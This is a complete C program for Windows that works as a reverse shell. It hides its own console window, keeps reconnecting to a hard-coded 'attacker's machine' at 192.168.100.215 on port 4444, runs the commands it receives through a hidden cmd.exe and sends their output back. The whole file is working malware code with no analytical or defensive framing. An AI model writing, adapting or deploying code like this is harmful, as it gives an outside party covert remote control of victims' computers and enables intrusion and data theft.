#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>

#define IP "192.168.100.215" // Attacker's machine IP
#define PORT 4444            // Port to use for the connection

// Function to hide the process window
void hide_console() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE); // Hide the console window
}

// Function to execute commands silently and capture output
void execute_command_silently(const char *cmd, SOCKET sock) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char buffer[4096];
    DWORD bytesRead;

    // Set up security attributes for pipe handles
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    // Create a pipe for the child process's STDOUT
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        send(sock, "Failed to create pipe\n", 22, 0);
        return;
    }

    // Ensure the read handle to the pipe is not inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Prepare the command string to use cmd.exe
    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /C %s", cmd);

    // Set up the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE; // Hide the child process window

    // Create the child process
    if (!CreateProcess(NULL, full_cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        send(sock, "Failed to execute command\n", 26, 0);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }

    // Close the write handle in the parent process
    CloseHandle(hWrite);

    // Read command output from the pipe
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0'; // Null-terminate the output
        send(sock, buffer, bytesRead, 0);
    }

    // Clean up
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Function to monitor connection and handle commands
void monitor_connection(struct sockaddr_in *server) {
    int sock;
    int connected = 0;

    while (1) {
        if (connected) {
            Sleep(2000);
            continue;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            Sleep(2000);
            continue;
        }

        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            closesocket(sock);
            Sleep(2000);
            continue;
        }

        connected = 1;

        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                connected = 0;
                closesocket(sock);
                break;
            }

            buffer[bytes_received] = '\0';

            // Handle "cd" command
            if (strncmp(buffer, "cd ", 3) == 0) {
                char *path = buffer + 3;
                path[strcspn(path, "\n")] = '\0';
                if (_chdir(path) == 0) {
                    send(sock, "Directory changed\n", 18, 0);
                } else {
                    send(sock, "Failed to change directory\n", 27, 0);
                }
                continue;
            }

            // Execute command silently
            execute_command_silently(buffer, sock);
        }
    }
}

// Main function
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    hide_console();

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    monitor_connection(&server);

    WSACleanup();
    return 0;
}

